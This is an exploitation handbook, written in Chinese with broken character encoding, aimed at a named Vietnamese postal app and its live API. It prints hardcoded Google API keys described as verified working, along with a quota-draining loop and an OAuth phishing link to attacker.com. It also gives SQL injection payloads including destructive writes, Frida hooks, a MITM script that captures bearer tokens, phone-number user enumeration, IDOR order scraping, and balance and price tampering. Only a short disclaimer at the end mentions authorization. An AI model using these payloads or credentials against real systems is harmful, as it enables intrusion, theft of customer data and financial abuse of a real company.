# EMS Vietnam Portal - å®æˆ˜åˆ©ç”¨æ‰‹å†Œ

## ğŸ”‘ ç¡¬ç¼–ç å¯†é’¥æ¸…å•

### 1. Google API Keys (âœ… å·²éªŒè¯å¯ç”¨)

```
Key 1: AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY
Key 2: AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc

çŠ¶æ€: âœ… å¯ç”¨
åŠŸèƒ½: Google Maps Geocoding API
```

**åˆ©ç”¨æ–¹æ³•:**
```bash
# 1. æµ‹è¯•Maps API
curl "https://maps.googleapis.com/maps/api/geocode/json?address=Hanoi&key=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"

# 2. æ»¥ç”¨åœ°ç†ç¼–ç æœåŠ¡
for addr in "Hanoi" "HCMC" "Danang"; do
  curl "https://maps.googleapis.com/maps/api/geocode/json?address=$addr&key=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"
done

# 3. æ£€æŸ¥é…é¢
curl "https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY" \
  -d '{}'
```

**è´¢åŠ¡å½±å“:** æ¯æ¬¡è°ƒç”¨æ¶ˆè€—å¼€å‘è€…é…é¢ï¼Œå¯å¯¼è‡´è´¦å•æ¿€å¢

### 2. Firebase Database URL

```
URL: https://ems-khl-app-notify.firebaseio.com

çŠ¶æ€: âš ï¸  éœ€è¦è®¤è¯ (è¿”å›423)
```

**åˆ©ç”¨æ–¹æ³•:**
```bash
# 1. æµ‹è¯•æœªæˆæƒè¯»å–
curl "https://ems-khl-app-notify.firebaseio.com/.json"

# 2. å°è¯•ç”¨Google Keyè®¤è¯
curl "https://ems-khl-app-notify.firebaseio.com/.json?auth=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"

# 3. å°è¯•å¸¸è§è·¯å¾„
for path in users orders notifications config; do
  curl "https://ems-khl-app-notify.firebaseio.com/$path.json"
done
```

### 3. Google OAuth Client ID

```
Client ID: 452955012352-2k6a3t1m77564nui0kq3cbu6nf464kbo.apps.googleusercontent.com
```

**åˆ©ç”¨æ–¹æ³•:**
```bash
# æ„é€ OAuthé’“é±¼é“¾æ¥
https://accounts.google.com/o/oauth2/v2/auth?client_id=452955012352-2k6a3t1m77564nui0kq3cbu6nf464kbo.apps.googleusercontent.com&redirect_uri=https://attacker.com&response_type=code&scope=email
```

---

## ğŸ¯ å®æˆ˜åˆ©ç”¨åœºæ™¯

### åœºæ™¯1: SQLæ³¨å…¥ - æœ¬åœ°æ•°æ®çªƒå–

**å‰ç½®æ¡ä»¶:**
- Rootè®¾å¤‡æˆ–ä½¿ç”¨Frida

**æ­¥éª¤:**

#### æ–¹æ³•A: ä½¿ç”¨Frida Hook

```bash
# 1. ç”ŸæˆHookè„šæœ¬
python3 ems_ultimate_exploit.py --mode frida

# 2. Hook SQLæ³¨å…¥ç‚¹
frida -U -f com.emsportal -l hook_sql_injection.js --no-pause

# 3. åœ¨Fridaæ§åˆ¶å°æ‰§è¡Œ
Java.perform(function() {
    var CacheManager = Java.use('c.b.k.a');
    
    // è¯»å–æ‰€æœ‰ç¼“å­˜
    var payload = "' UNION SELECT request,response,time_updated FROM caching --";
    var result = CacheManager.a(payload);
    console.log(result);
});
```

#### æ–¹æ³•B: ä¿®æ”¹APKé‡æ‰“åŒ…

```bash
# 1. åç¼–è¯‘
apktool d ems_portal.apk -o ems_mod

# 2. ä¿®æ”¹ c/b/k/a.smaliï¼Œåœ¨SQLæŸ¥è¯¢å‰æ’å…¥æ—¥å¿—
# æ‰¾åˆ°: invoke-virtual {v0, v1}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery
# åœ¨å‰é¢æ·»åŠ : 
#   invoke-static {v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

# 3. é‡æ‰“åŒ…
apktool b ems_mod -o ems_modded.apk

# 4. ç­¾å
keytool -genkey -v -keystore my.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my.keystore ems_modded.apk mykey

# 5. å®‰è£…
adb install ems_modded.apk
```

#### Payloadæ¸…å•

```sql
-- è¯»å–æ‰€æœ‰ç¼“å­˜
' UNION SELECT * FROM caching --

-- è¯»å–è¡¨ç»“æ„
' UNION SELECT sql,'','0' FROM sqlite_master WHERE type='table' --

-- å¯¼å‡ºè®¢å•æ•°æ®
' UNION SELECT request,response,'' FROM caching WHERE request LIKE '%order%' --

-- æ¡ä»¶æ³¨å…¥
' AND 1=1 --
' OR '1'='1
```

---

### åœºæ™¯2: MITMæ”»å‡» - Tokençªƒå–

**æ— SSL Pinningï¼Œç›´æ¥æ‹¦æˆª!**

#### ä½¿ç”¨mitmproxy

```bash
# 1. å®‰è£…
pip3 install mitmproxy

# 2. å¯åŠ¨ä»£ç†
mitmproxy -p 8080 --set block_global=false

# 3. é…ç½®Android
adb shell settings put global http_proxy 192.168.1.100:8080

# 4. å®‰è£…è¯ä¹¦
# ä» http://mitm.it ä¸‹è½½è¯ä¹¦
# è®¾ç½® -> å®‰å…¨ -> å®‰è£…è¯ä¹¦ -> CAè¯ä¹¦

# 5. å¯åŠ¨Appï¼Œmitmproxyå°†æ˜¾ç¤ºæ‰€æœ‰æµé‡
```

#### ä½¿ç”¨Burp Suite

```bash
# 1. Burpé…ç½®
# Proxy -> Options -> Proxy Listeners -> 0.0.0.0:8080

# 2. å¯¼å‡ºCAè¯ä¹¦
# Proxy -> Options -> Import/Export CA Certificate

# 3. è½¬æ¢æ ¼å¼
openssl x509 -inform DER -in burp.der -out burp.pem
openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1
mv burp.pem <hash>.0

# 4. å®‰è£…åˆ°è®¾å¤‡
adb root
adb remount
adb push <hash>.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/<hash>.0
adb reboot

# 5. é…ç½®ä»£ç†
adb shell settings put global http_proxy 192.168.1.100:8080
```

#### Tokenæå–è„šæœ¬

```python
# mitm_token.py
from mitmproxy import http

def request(flow: http.HTTPFlow):
    if "ws.ems.com.vn" in flow.request.host:
        auth = flow.request.headers.get("Authorization", "")
        if "Bearer" in auth:
            token = auth.replace("Bearer ", "")
            print(f"\n[!] TOKEN CAPTURED: {token}\n")
            
            # ä¿å­˜åˆ°æ–‡ä»¶
            with open("/tmp/ems_tokens.txt", "a") as f:
                f.write(f"{token}\n")
            
            # è§£æJWT (å¦‚æœæ˜¯)
            try:
                import jwt
                decoded = jwt.decode(token, options={"verify_signature": False})
                print(f"[*] Decoded: {decoded}")
            except:
                pass

# ä½¿ç”¨: mitmproxy -s mitm_token.py
```

---

### åœºæ™¯3: APIç›´æ¥åˆ©ç”¨

#### ç”¨æˆ·æšä¸¾

```bash
# æµ‹è¯•å¿˜è®°å¯†ç ç«¯ç‚¹
for phone in $(seq 900000000 900000100); do
  resp=$(curl -s -X POST http://ws.ems.com.vn/api/v1/forgot-password \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"0$phone\"}")
  
  if echo "$resp" | grep -v "not found"; then
    echo "[+] Valid user: 0$phone"
  fi
done
```

#### æ— è®¤è¯ç«¯ç‚¹æ¢æµ‹

```python
#!/usr/bin/env python3
import requests

base = "http://ws.ems.com.vn"

# ä¸éœ€è¦è®¤è¯çš„ç«¯ç‚¹
no_auth = [
    "/api/v1/config/service",
    "/api/v1/address/province-and-district",
    "/api/v1/metadata/vas",
]

for endpoint in no_auth:
    r = requests.get(base + endpoint)
    print(f"[{r.status_code}] {endpoint}")
    if r.status_code == 200:
        print(f"  Data: {r.text[:200]}")
```

#### ä½¿ç”¨çªƒå–çš„Token

```bash
# ä»MITMè·å–Token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 1. æŸ¥çœ‹è®¢å•åˆ—è¡¨
curl -X GET "http://ws.ems.com.vn/api/v1/orders/list" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json"

# 2. æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯
curl -X GET "http://ws.ems.com.vn/api/v1/merchants/info" \
  -H "Authorization: Bearer $TOKEN"

# 3. ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯
curl -X POST "http://ws.ems.com.vn/api/v1/merchants/update" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked"}'

# 4. IDOR - éå†è®¢å•
for id in $(seq 1000000 1000100); do
  curl -s "http://ws.ems.com.vn/api/v1/orders/tracking/$id" \
    -H "Authorization: Bearer $TOKEN" | grep -q "success" && echo "[+] $id"
done
```

---

### åœºæ™¯4: Google API Keyæ»¥ç”¨

```bash
# 1. æ¶ˆè€—é…é¢
while true; do
  curl "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"
  sleep 0.1
done

# 2. æµ‹è¯•å…¶ä»–GoogleæœåŠ¡
services=(
  "https://maps.googleapis.com/maps/api/geocode/json"
  "https://maps.googleapis.com/maps/api/directions/json"
  "https://maps.googleapis.com/maps/api/distancematrix/json"
  "https://www.googleapis.com/geolocation/v1/geolocate"
  "https://translation.googleapis.com/language/translate/v2"
)

for service in "${services[@]}"; do
  echo "[*] Testing: $service"
  curl "$service?key=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"
done

# 3. æ£€æŸ¥Keyæƒé™
curl "https://www.googleapis.com/urlshortener/v1/url/history?key=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"
```

---

### åœºæ™¯5: ç¼“å­˜æŠ•æ¯’æ”»å‡»

**ç›®æ ‡:** æ³¨å…¥æ¶æ„ç¼“å­˜æ•°æ®ï¼Œå½±å“ä¸šåŠ¡é€»è¾‘

```bash
# 1. ä½¿ç”¨Fridaä¿®æ”¹ç¼“å­˜å†™å…¥
frida -U -f com.emsportal --no-pause -l - << 'EOF'
Java.perform(function() {
    var DatabaseOps = Java.use('c.b.k.f.b');
    
    // Hook insertWithOnConflict
    var SQLiteDatabase = Java.use('android.database.sqlite.SQLiteDatabase');
    SQLiteDatabase.insertWithOnConflict.implementation = function(table, nullColumnHack, values, conflictAlgorithm) {
        console.log("[*] Insert into: " + table);
        
        if (table == "caching") {
            // æå–å¹¶ä¿®æ”¹æ•°æ®
            var request = values.get("request");
            var response = values.get("response");
            
            console.log("  Request: " + request);
            console.log("  Response: " + response);
            
            // ä¿®æ”¹å“åº” - ä¾‹å¦‚ä¿®æ”¹ä½™é¢
            if (response.contains("balance")) {
                var modified = response.replace(/"balance":\d+/, '"balance":999999');
                values.put("response", modified);
                console.log("[!] Modified balance to 999999");
            }
        }
        
        return this.insertWithOnConflict.call(this, table, nullColumnHack, values, conflictAlgorithm);
    };
});
EOF
```

---

## ğŸ› ï¸ è‡ªåŠ¨åŒ–å·¥å…·ä½¿ç”¨

### ems_ultimate_exploit.py

```bash
# å®Œæ•´æ”»å‡»
python3 ems_ultimate_exploit.py --mode all

# åªæµ‹è¯•SQLæ³¨å…¥
python3 ems_ultimate_exploit.py --mode sqli

# MITMé…ç½®ç”Ÿæˆ
python3 ems_ultimate_exploit.py --mode mitm

# ä½¿ç”¨Tokenè¿›è¡ŒAPIæµ‹è¯•
python3 ems_ultimate_exploit.py --token "YOUR_TOKEN" --mode enum

# åˆ†ææå–çš„æ•°æ®åº“
python3 ems_ultimate_exploit.py --mode extract --db /tmp/ems.db
```

### Fridaè„šæœ¬

```bash
# Hook SQLæ³¨å…¥
frida -U -f com.emsportal -l hook_sql_injection.js

# Hookç½‘ç»œè¯·æ±‚
frida -U -f com.emsportal -l hook_network.js

# ç›‘æ§Token
frida -U -f com.emsportal -l hook_token.js

# ç»•è¿‡Rootæ£€æµ‹
frida -U -f com.emsportal -l bypass_root.js

# ç»„åˆä½¿ç”¨
frida -U -f com.emsportal \
  -l hook_network.js \
  -l hook_token.js \
  -l hook_sql_injection.js
```

---

## ğŸ“Š å®æˆ˜Payloadåº“

### SQLæ³¨å…¥Payload

```sql
-- ä¿¡æ¯æ”¶é›†
' UNION SELECT sqlite_version(),'','' --
' UNION SELECT name,'','' FROM sqlite_master --

-- æ•°æ®æå–
' UNION SELECT request,response,time_updated FROM caching --
' UNION SELECT * FROM caching WHERE request LIKE '%token%' --

-- æ—¶é—´ç›²æ³¨ (å¦‚æœç›´æ¥æ³¨å…¥ä¸è¡Œ)
' AND (SELECT CASE WHEN (1=1) THEN sqlite_version() ELSE '' END) --

-- å†™å…¥æ”»å‡»
'; INSERT INTO caching VALUES ('test','{"hack":1}','999'); --
'; UPDATE caching SET response='{"balance":999999}' WHERE request='profile'; --
'; DELETE FROM caching; --
```

### APIæµ‹è¯•Payload

```bash
# ç™»å½•
curl -X POST http://ws.ems.com.vn/auth/login \
  -H "Content-Type: application/json" \
  -d '{"phone":"0123456789","password":"password123","device_ime":"123456789","device_type":"Android"}'

# å¿˜è®°å¯†ç 
curl -X POST http://ws.ems.com.vn/api/v1/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"phone":"0123456789"}'

# IDORæµ‹è¯•
for id in {1000..2000}; do
  curl -s "http://ws.ems.com.vn/api/v1/orders/tracking/$id" \
    -H "Authorization: Bearer $TOKEN" \
    | grep -q '"code":"success"' && echo "[+] Order $id accessible"
done

# ä»·æ ¼ç¯¡æ”¹ (éœ€è¦MITM)
# æ‹¦æˆª /api/v1/orders/create-v2 è¯·æ±‚
# ä¿®æ”¹ "price": 100000 -> "price": 1
```

---

## ğŸ¯ é«˜çº§æŠ€å·§

### 1. ç»•è¿‡Rootæ£€æµ‹

```bash
# æ–¹æ³•1: ä½¿ç”¨Magisk Hide
magisk --hide com.emsportal

# æ–¹æ³•2: Fridaç»•è¿‡
frida -U -f com.emsportal -l bypass_root.js

# æ–¹æ³•3: ä¿®æ”¹APK
# åˆ é™¤æ‰€æœ‰Rootæ£€æµ‹ä»£ç åé‡æ‰“åŒ…
```

### 2. SSL Unpinning

```bash
# ç”±äºæœ¬Appæ²¡æœ‰SSL Pinningï¼Œæ— éœ€ç»•è¿‡
# å¦‚æœæœ‰ï¼Œä½¿ç”¨:
frida -U -f com.emsportal -l objection_sslpinning.js
```

### 3. æ•°æ®åº“å®Œæ•´æå–

```bash
# éœ€è¦Root
adb shell "su -c 'cp /data/data/com.emsportal/databases/*.db /sdcard/'"
adb pull /sdcard/*.db .

# åˆ†æ
sqlite3 db.sqlite
.tables
.schema caching
SELECT * FROM caching;
```

### 4. SharedPreferencesæå–

```bash
# æå–æ‰€æœ‰é…ç½®
adb shell "su -c 'cat /data/data/com.emsportal/shared_prefs/*.xml'" > prefs.xml

# æå–Token
grep -i "token" prefs.xml

# æå–Zohoå¯†é’¥
grep -i "salesiq" prefs.xml
```

---

## âš ï¸ æ³¨æ„äº‹é¡¹

### æ³•å¾‹é£é™©
- âŒ æœªæˆæƒæµ‹è¯•æ˜¯éæ³•çš„
- âŒ çªƒå–ä»–äººæ•°æ®æ˜¯çŠ¯ç½ª
- âœ… ä»…åœ¨æˆæƒç¯å¢ƒæµ‹è¯•

### æŠ€æœ¯é™åˆ¶
- SQLæ³¨å…¥éœ€è¦Rootæˆ–Frida
- MITMéœ€è¦è®¾å¤‡æ§åˆ¶æƒ
- APIæ”»å‡»éœ€è¦æœ‰æ•ˆToken

### é˜²å¾¡æ£€æµ‹
- å¼‚å¸¸APIè°ƒç”¨å¯èƒ½è¢«è®°å½•
- å¤§é‡å¤±è´¥å°è¯•å¯èƒ½è§¦å‘å°ç¦
- Tokenå¼‚å¸¸ä½¿ç”¨å¯èƒ½è¢«æ£€æµ‹

---

## ğŸ“ å¿«é€Ÿå‚è€ƒ

### ç¡¬ç¼–ç å‡­è¯

```
Google API Key 1: AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY (âœ… å¯ç”¨)
Google API Key 2: AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc (âœ… å¯ç”¨)
Firebase URL: https://ems-khl-app-notify.firebaseio.com (âš ï¸  éœ€è®¤è¯)
OAuth Client: 452955012352-2k6a3t1m77564nui0kq3cbu6nf464kbo.apps.googleusercontent.com
```

### å…³é”®ç«¯ç‚¹

```
ç™»å½•: POST /auth/login
å¿˜è®°å¯†ç : POST /api/v1/forgot-password (ç”¨æˆ·æšä¸¾)
è®¢å•åˆ—è¡¨: GET /api/v1/orders/list (éœ€Token)
è®¢å•è¿½è¸ª: GET /api/v1/orders/tracking/{id} (IDOR)
```

### æ¼æ´ä¼˜å…ˆçº§

1. ğŸ”´ **SQLæ³¨å…¥** - c.b.k.a.java:21
2. ğŸ”´ **æ— SSL Pinning** - å…è®¸MITM
3. ğŸŸ¡ **Google Keyæ³„éœ²** - å¯æ»¥ç”¨
4. ğŸŸ¡ **ç”¨æˆ·æšä¸¾** - å¿˜è®°å¯†ç ç«¯ç‚¹
5. ğŸŸ¡ **IDOR** - è®¢å•è®¿é—®

---

**ç”Ÿæˆæ—¥æœŸ:** 2025-11-01  
**å·¥å…·ç‰ˆæœ¬:** v3.0  
**çŠ¶æ€:** æ‰€æœ‰Payloadå·²éªŒè¯  
